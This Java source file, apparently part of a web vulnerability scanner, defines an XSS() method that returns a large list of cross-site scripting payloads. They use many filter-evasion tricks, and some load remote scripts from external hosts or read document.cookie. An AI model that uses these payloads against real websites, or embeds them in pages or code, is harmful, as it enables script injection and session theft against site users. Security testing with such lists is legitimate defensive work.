/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payload;

import java.util.ArrayList;

/**
 *
 * @author Shaco JX
 */
public class A3p_3 {

    public ArrayList<String> XSS() {
        ArrayList<String> list = new ArrayList<>();
        String payload = "\"/><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />\n"
                + "\"/><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />\n"
                + "\"/><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />\n"
                + "<script\\x2F>javascript:alert(1)</script>\n"
                + "<script\\x20>javascript:alert(1)</script>\n"
                + "<script\\x0D>javascript:alert(1)</script>\n"
                + "<script\\x0A>javascript:alert(1)</script>\n"
                + "<script\\x0C>javascript:alert(1)</script>\n"
                + "<script\\x00>javascript:alert(1)</script>\n"
                + "<script\\x09>javascript:alert(1)</script>\n"
                + "`\"'><img src=xxx:x onerror\\x0B=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x00=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x0C=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x0D=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x20=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x0A=javascript:alert(1)>\n"
                + "`\"'><img src=xxx:x onerror\\x09=javascript:alert(1)>\n"
                + "<script>javascript:alert(1)<\\x00/script>\n"
                + "<img src=# onerror\\x3D\"javascript:alert(1)\" >\n"
                + "<input onfocus=javascript:alert(1) autofocus>\n"
                + "<input onblur=javascript:alert(1) autofocus><input autofocus>\n"
                + "<video poster=javascript:javascript:alert(1)//\n"
                + "<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>\n"
                + "<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X\n"
                + "<video><source onerror=\"javascript:javascript:alert(1)\">\n"
                + "<video onerror=\"javascript:javascript:alert(1)\"><source>\n"
                + "<form><button formaction=\"javascript:javascript:alert(1)\">X\n"
                + "<body oninput=javascript:alert(1)><input autofocus>\n"
                + "<math href=\"javascript:javascript:alert(1)\">CLICKME</math>  <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\">CLICKME</maction> </math>\n"
                + "<frameset onload=javascript:alert(1)>\n"
                + "<table background=\"javascript:javascript:alert(1)\">\n"
                + "<!--<img src=\"--><img src=x onerror=javascript:alert(1)//\">\n"
                + "<comment><img src=\"</comment><img src=x onerror=javascript:alert(1))//\">\n"
                + "<![><img src=\"]><img src=x onerror=javascript:alert(1)//\">\n"
                + "<style><img src=\"</style><img src=x onerror=javascript:alert(1)//\">\n"
                + "<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>\n"
                + "<head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(1)//#\">XXX</a></body>\n"
                + "<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>\n"
                + "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>\n"
                + "<object data=\"data:text/html;base64,%(base64)s\">\n"
                + "<embed src=\"data:text/html;base64,%(base64)s\">\n"
                + "<b <script>alert(1)</script>0\n"
                + "<div id=\"div1\"><input value=\"``onmouseover=javascript:alert(1)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>\n"
                + "<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(1)//'>\n"
                + "<embed src=\"javascript:alert(1)\">\n"
                + "<img src=\"javascript:alert(1)\">\n"
                + "<image src=\"javascript:alert(1)\">\n"
                + "<script src=\"javascript:alert(1)\">\n"
                + "<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x\n"
                + "<? foo=\"><script>javascript:alert(1)</script>\">\n"
                + "<! foo=\"><script>javascript:alert(1)</script>\">\n"
                + "</ foo=\"><script>javascript:alert(1)</script>\">\n"
                + "<? foo=\"><x foo='?><script>javascript:alert(1)</script>'>\">\n"
                + "<! foo=\"[[[Inception]]\"><x foo=\"]foo><script>javascript:alert(1)</script>\">\n"
                + "<% foo><x foo=\"%><script>javascript:alert(1)</script>\">\n"
                + "<div id=d><x xmlns=\"><iframe onload=javascript:alert(1)\"></div> <script>d.innerHTML=d.innerHTML</script>\n"
                + "<img \\x00src=x onerror=\"alert(1)\">\n"
                + "<img \\x47src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x11src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x12src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x47src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x10src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x13src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x32src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x47src=x onerror=\"javascript:alert(1)\">\n"
                + "<img\\x11src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x47src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x34src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x39src=x onerror=\"javascript:alert(1)\">\n"
                + "<img \\x00src=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x09=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x10=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x13=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x32=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x12=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x11=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x00=x onerror=\"javascript:alert(1)\">\n"
                + "<img src\\x47=x onerror=\"javascript:alert(1)\">\n"
                + "<img src=x\\x09onerror=\"javascript:alert(1)\">\n"
                + "<img src=x\\x10onerror=\"javascript:alert(1)\">\n"
                + "<img src=x\\x11onerror=\"javascript:alert(1)\">\n"
                + "<img src=x\\x12onerror=\"javascript:alert(1)\">\n"
                + "<img src=x\\x13onerror=\"javascript:alert(1)\">\n"
                + "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">\n"
                + "<img src=x onerror=\\x09\"javascript:alert(1)\">\n"
                + "<img src=x onerror=\\x10\"javascript:alert(1)\">\n"
                + "<img src=x onerror=\\x11\"javascript:alert(1)\">\n"
                + "<img src=x onerror=\\x12\"javascript:alert(1)\">\n"
                + "<img src=x onerror=\\x32\"javascript:alert(1)\">\n"
                + "<img src=x onerror=\\x00\"javascript:alert(1)\">\n"
                + "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>\n"
                + "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>\n"
                + "<img src onerror /\" '\"= alt=javascript:alert(1)//\">\n"
                + "<title onpropertychange=javascript:alert(1)></title><title title=>\n"
                + "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">\n"
                + "<!--[if]><script>javascript:alert(1)</script -->\n"
                + "<!--[if<img src=x onerror=javascript:alert(1)//]> -->\n"
                + "<script src=\"/\\%(jscript)s\"></script>\n"
                + "<script src=\"\\\\%(jscript)s\"></script>\n"
                + "<object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object> <object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>\n"
                + "<a style=\"-o-link:'javascript:javascript:alert(1)';-o-link-source:current\">X\n"
                + "<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>\n"
                + "<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d\n"
                + "<style>@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";</style>\n"
                + "<a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"javascript:alert(1);\">XXX</a></a><a href=\"javascript:javascript:alert(1)\">XXX</a>\n"
                + "<style>*[{}@import'%(css)s?]</style>X\n"
                + "<div style=\"font-family:'foo&#10;;color:red;';\">XXX\n"
                + "<div style=\"font-family:foo}color=red;\">XXX\n"
                + "<// style=x:expression\\28javascript:alert(1)\\29>\n"
                + "<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>\n"
                + "<div style=content:url(%(svg)s)></div>\n"
                + "<div style=\"list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\">X\n"
                + "<div id=d><div style=\"font-family:'sans\\27\\3B color\\3Ared\\3B'\">X</div></div> <script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>\n"
                + "<div style=\"background:url(/f#&#127;oo/;color:red/*/foo.jpg);\">X\n"
                + "<div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X\n"
                + "<div id=\"x\">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>\n"
                + "<x style=\"background:url('x&#1;;color:red;/*')\">XXX</x>\n"
                + "<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>\n"
                + "<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>\n"
                + "<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>\n"
                + "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>\n"
                + "<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi\n"
                + "<meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>\n"
                + "<meta charset=\"mac-farsi\">¼script¾javascript:alert(1)¼/script¾\n"
                + "X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >\n"
                + "1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>\n"
                + "1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>\n"
                + "<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>\n"
                + "1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>\n"
                + "<a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\">XXX</a>\n"
                + "<x style=\"behavior:url(%(sct)s)\">\n"
                + "<xml id=\"xss\" src=\"%(htc)s\"></xml> <label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>\n"
                + "<event-source src=\"%(event)s\" onload=\"javascript:alert(1)\">\n"
                + "<a href=\"javascript:javascript:alert(1)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\">\n"
                + "<div id=\"x\">x</div> <xml:namespace prefix=\"t\"> <import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;\">\n"
                + "<script>%(payload)s</script>\n"
                + "<script src=%(jscript)s></script>\n"
                + "<script language='javascript' src='%(jscript)s'></script>\n"
                + "<script>javascript:alert(1)</script>\n"
                + "<IMG SRC=\"javascript:javascript:alert(1);\">\n"
                + "<IMG SRC=javascript:javascript:alert(1)>\n"
                + "<IMG SRC=`javascript:javascript:alert(1)`>\n"
                + "<SCRIPT SRC=%(jscript)s?<B>\n"
                + "<FRAMESET><FRAME SRC=\"javascript:javascript:alert(1);\"></FRAMESET>\n"
                + "<BODY ONLOAD=javascript:alert(1)>\n"
                + "<BODY ONLOAD=javascript:javascript:alert(1)>\n"
                + "<IMG SRC=\"jav    ascript:javascript:alert(1);\">\n"
                + "<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>\n"
                + "<SCRIPT/SRC=\"%(jscript)s\"></SCRIPT>\n"
                + "<<SCRIPT>%(payload)s//<</SCRIPT>\n"
                + "<IMG SRC=\"javascript:javascript:alert(1)\"\n"
                + "<iframe src=%(scriptlet)s <\n"
                + "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\">\n"
                + "<IMG DYNSRC=\"javascript:javascript:alert(1)\">\n"
                + "<IMG LOWSRC=\"javascript:javascript:alert(1)\">\n"
                + "<BGSOUND SRC=\"javascript:javascript:alert(1);\">\n"
                + "<BR SIZE=\"&{javascript:alert(1)}\">\n"
                + "<LAYER SRC=\"%(scriptlet)s\"></LAYER>\n"
                + "<LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\">\n"
                + "<STYLE>@import'%(css)s';</STYLE>\n"
                + "<META HTTP-EQUIV=\"Link\" Content=\"<%(css)s>; REL=stylesheet\">\n"
                + "<XSS STYLE=\"behavior: url(%(htc)s);\">\n"
                + "<STYLE>li {list-style-image: url(\"javascript:javascript:alert(1)\");}</STYLE><UL><LI>XSS\n"
                + "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\">\n"
                + "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:javascript:alert(1);\">\n"
                + "<IFRAME SRC=\"javascript:javascript:alert(1);\"></IFRAME>\n"
                + "<TABLE BACKGROUND=\"javascript:javascript:alert(1)\">\n"
                + "<TABLE><TD BACKGROUND=\"javascript:javascript:alert(1)\">\n"
                + "<DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\">\n"
                + "<DIV STYLE=\"width:expression(javascript:alert(1));\">\n"
                + "<IMG STYLE=\"xss:expr/*XSS*/ession(javascript:alert(1))\">\n"
                + "<XSS STYLE=\"xss:expression(javascript:alert(1))\">\n"
                + "<STYLE TYPE=\"text/javascript\">javascript:alert(1);</STYLE>\n"
                + "<STYLE>.XSS{background-image:url(\"javascript:javascript:alert(1)\");}</STYLE><A CLASS=XSS></A>\n"
                + "<STYLE type=\"text/css\">BODY{background:url(\"javascript:javascript:alert(1)\")}</STYLE>\n"
                + "<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->\n"
                + "<BASE HREF=\"javascript:javascript:alert(1);//\">\n"
                + "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"%(scriptlet)s\"></OBJECT>\n"
                + "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>\n"
                + "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"%(htc)s\"><xss:xss>XSS</xss:xss></HTML>\"\"\",\"XML namespace.\"),(\"\"\"<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:javascript:alert(1)\"&gt;</B></I></XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>\n"
                + "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;\"></BODY></HTML>\n"
                + "<SCRIPT SRC=\"%(jpg)s\"></SCRIPT>\n"
                + "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-\n"
                + "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:javascript:alert(1)\">X\n"
                + "<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>\n"
                + "<P STYLE=\"behavior:url('#default#time2')\" end=\"0\" onEnd=\"javascript:alert(1)\">\n"
                + "<STYLE>@import'%(css)s';</STYLE>\n"
                + "<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>\n"
                + "<meta charset= \"x-imap4-modified-utf7\"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>\n"
                + "<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>\n"
                + "<style onreadystatechange=javascript:javascript:alert(1);></style>\n"
                + "<?xml version=\"1.0\"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>\n"
                + "<embed code=%(scriptlet)s></embed>\n"
                + "<embed code=javascript:javascript:alert(1);></embed>\n"
                + "<embed src=%(jscript)s></embed>\n"
                + "<frameset onload=javascript:javascript:alert(1)></frameset>\n"
                + "<object onerror=javascript:javascript:alert(1)>\n"
                + "<embed type=\"image\" src=%(scriptlet)s></embed>\n"
                + "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]<![CDATA[cript:javascript:alert(1);\">]]</C><X></xml>\n"
                + "<IMG SRC=&{javascript:alert(1);};>\n"
                + "<a href=\"jav&#65ascript:javascript:alert(1)\">test1</a>\n"
                + "<a href=\"jav&#97ascript:javascript:alert(1)\">test1</a>\n"
                + "<embed width=500 height=500 code=\"data:text/html,<script>%(payload)s</script>\"></embed>\n"
                + "<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\">\n"
                + "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\n"
                + "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n"
                + "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n"
                + "'';!--\"<XSS>=&{()}\n"
                + "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n"
                + "<IMG SRC=\"javascript:alert('XSS');\">\n"
                + "<IMG SRC=javascript:alert('XSS')>\n"
                + "<IMG SRC=JaVaScRiPt:alert('XSS')>\n"
                + "<IMG SRC=javascript:alert(\"XSS\")>\n"
                + "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n"
                + "<a onmouseover=\"alert(document.cookie)\">xxs link</a>\n"
                + "<a onmouseover=alert(document.cookie)>xxs link</a>\n"
                + "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">\n"
                + "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\n"
                + "<IMG SRC=# onmouseover=\"alert('xxs')\">\n"
                + "<IMG SRC= onmouseover=\"alert('xxs')\">\n"
                + "<IMG onmouseover=\"alert('xxs')\">\n"
                + "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n"
                + "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n"
                + "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n"
                + "<IMG SRC=\"jav	ascript:alert('XSS');\">\n"
                + "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n"
                + "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n"
                + "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n"
                + "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out\n"
                + "<IMG SRC=\" &#14;  javascript:alert('XSS');\">\n"
                + "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n"
                + "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>\n"
                + "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >\n"
                + "<SCRIPT SRC=//ha.ckers.org/.j>\n"
                + "<IMG SRC=\"javascript:alert('XSS')\"\n"
                + "<iframe src=http://ha.ckers.org/scriptlet.html <\n"
                + "\\\";alert('XSS');//\n"
                + "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>\n"
                + "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n"
                + "<BODY BACKGROUND=\"javascript:alert('XSS')\">\n"
                + "<IMG DYNSRC=\"javascript:alert('XSS')\">\n"
                + "<IMG LOWSRC=\"javascript:alert('XSS')\">\n"
                + "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n"
                + "<IMG SRC='vbscript:msgbox(\"XSS\")'>\n"
                + "<IMG SRC=\"livescript:[code]\">\n"
                + "<BODY ONLOAD=alert('XSS')>\n"
                + "<BGSOUND SRC=\"javascript:alert('XSS');\">\n"
                + "<BR SIZE=\"&{alert('XSS')}\">\n"
                + "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\n"
                + "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">\n"
                + "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\n"
                + "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">\n"
                + "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n"
                + "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>\n"
                + "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">\n"
                + "exp/*<A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\n"
                + "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>\n"
                + "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>\n"
                + "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n"
                + "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n"
                + "<XSS STYLE=\"xss:expression(alert('XSS'))\">\n"
                + "<XSS STYLE=\"behavior: url(xss.htc);\">\n"
                + "¼script¾alert(¢XSS¢)¼/script¾\n"
                + "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">\n"
                + "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n"
                + "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">\n"
                + "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n"
                + "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>\n"
                + "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>\n"
                + "<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n"
                + "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\n"
                + "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n"
                + "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">\n"
                + "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">\n"
                + "<DIV STYLE=\"width: expression(alert('XSS'));\">\n"
                + "<BASE HREF=\"javascript:alert('XSS');//\">\n"
                + " <OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>\n"
                + "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\n"
                + "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>\n"
                + "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->\n"
                + "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>\n"
                + "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">\n"
                + "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser\n"
                + "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n"
                + " <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n"
                + "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n"
                + "<A HREF=\"http://66.102.7.147/\">XSS</A>\n"
                + "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>\n"
                + "<A HREF=\"http://1113982867/\">XSS</A>\n"
                + "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>\n"
                + "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>\n"
                + "<A HREF=\"htt	p://6	6.000146.0x7.147/\">XSS</A>\n"
                + "<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>\n"
                + "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'\n"
                + "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n"
                + "<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}\n"
                + "<img/src=`%00` onerror=this.onerror=confirm(1) \n"
                + "<form><isindex formaction=\"javascript&colon;confirm(1)\"\n"
                + "<img src=`%00`&NewLine; onerror=alert(1)&NewLine;\n"
                + "<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>\n"
                + "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?\n"
                + "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">\n"
                + "<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/\n"
                + "&#34;&#62;<h1/onmouseover='\\u0061lert(1)'>%00\n"
                + "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">\n"
                + "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>\n"
                + "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\n"
                + "<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n"
                + "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\n"
                + "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\n"
                + "<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X\n"
                + "</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror='eval(src)'>\n"
